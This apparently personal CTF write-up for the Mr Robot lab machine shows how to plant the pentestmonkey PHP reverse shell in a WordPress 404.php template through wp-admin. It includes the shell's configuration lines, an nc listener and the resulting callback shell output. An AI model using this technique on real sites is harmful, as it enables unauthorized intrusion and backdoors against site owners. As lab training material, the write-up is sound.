<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Get a shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Getting a shell</h1></strong><br />You can get a shell from the <code>wp-admin</code> page by editing a <code>.php</code> page on the site with your reverse shell code.<br /><br />Go to Appearance &gt; Editor<br /><a href=""><img src="images/222-1.png" alt="images/222-1.png" /></a><br /><br />The <code>404.php</code> page is the easiest to edit. <br />Configure the PHP shell and then paste it into <code>404.php</code> template.<br /><div class="codebox"><div class="codebox">root@kali:~/ctf/mrRobot/80http#&nbsp;ls&nbsp;/usr/share/webshells/php<br />findsock.c&nbsp;&nbsp;php-backdoor.php&nbsp;&nbsp;php-findsock-shell.php&nbsp;&nbsp;php-reverse-shell.php&nbsp;&nbsp;qsd-php-backdoor.php&nbsp;&nbsp;simple-backdoor.php<br />root@kali:~/ctf/mrRobot/80http#&nbsp;cp&nbsp;/usr/share/webshells/php/php-reverse-shell.php&nbsp;.<br />root@kali:~/ctf/mrRobot/80http#&nbsp;nano&nbsp;php-reverse-shell.php<br />...<br />//&nbsp;Usage<br />//&nbsp;-----<br />//&nbsp;See&nbsp;http://pentestmonkey.net/tools/php-reverse-shell&nbsp;if&nbsp;you&nbsp;get&nbsp;stuck.<br /><br />set_time_limit&nbsp;(0);<br />$VERSION&nbsp;=&nbsp;&quot;1.0&quot;;<br />$ip&nbsp;=&nbsp;&#39;192.168.1.183&#39;;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br />$port&nbsp;=&nbsp;9001;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br />$chunk_size&nbsp;=&nbsp;1400;<br />$write_a&nbsp;=&nbsp;null;<br />$error_a&nbsp;=&nbsp;null;<br />$shell&nbsp;=&nbsp;&#39;uname&nbsp;-a;&nbsp;w;&nbsp;id;&nbsp;/bin/sh&nbsp;-i&#39;;<br />$daemon&nbsp;=&nbsp;0;<br />$debug&nbsp;=&nbsp;0;<br />...<br />root@kali:~/ctf/mrRobot/80http#&nbsp;mv&nbsp;php-reverse-shell.php&nbsp;phprs.php</div></div><br /><a href=""><img src="images/222-2.png" alt="images/222-2.png" /></a><br /><br />Now whenever we visit a page on the site that doesn&#39;t exist, the website will redirect us to a 404 and load the 404.php error page. When we we hit the 404 page, our PHP reverse shell will run.<br /><br />Prep your listener<br /><div class="codebox"><div class="codebox">root@kali:~/ctf/mrRobot/80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />Navigate to a page on the site that doesn&#39;t exist (or <code>404.php</code>)<br /><code>http://192.168.1.170/404.php</code><br />And we should get a callback on our listener.<br /><div class="codebox"><div class="codebox">root@kali:~/ctf/mrRobot/80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br />connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[192.168.1.170]&nbsp;53513<br />Linux&nbsp;linux&nbsp;3.13.0-55-generic&nbsp;#94-Ubuntu&nbsp;SMP&nbsp;Thu&nbsp;Jun&nbsp;18&nbsp;00:27:10&nbsp;UTC&nbsp;2015&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux<br />&nbsp;10:47:42&nbsp;up&nbsp;15&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.03,&nbsp;0.06<br />USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br />uid=1(daemon)&nbsp;gid=1(daemon)&nbsp;groups=1(daemon)<br />/bin/sh:&nbsp;0:&nbsp;cant&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br />$&nbsp;id<br />uid=1(daemon)&nbsp;gid=1(daemon)&nbsp;groups=1(daemon)<br />$&nbsp;</div></div><br /></div>
</body>
</html>
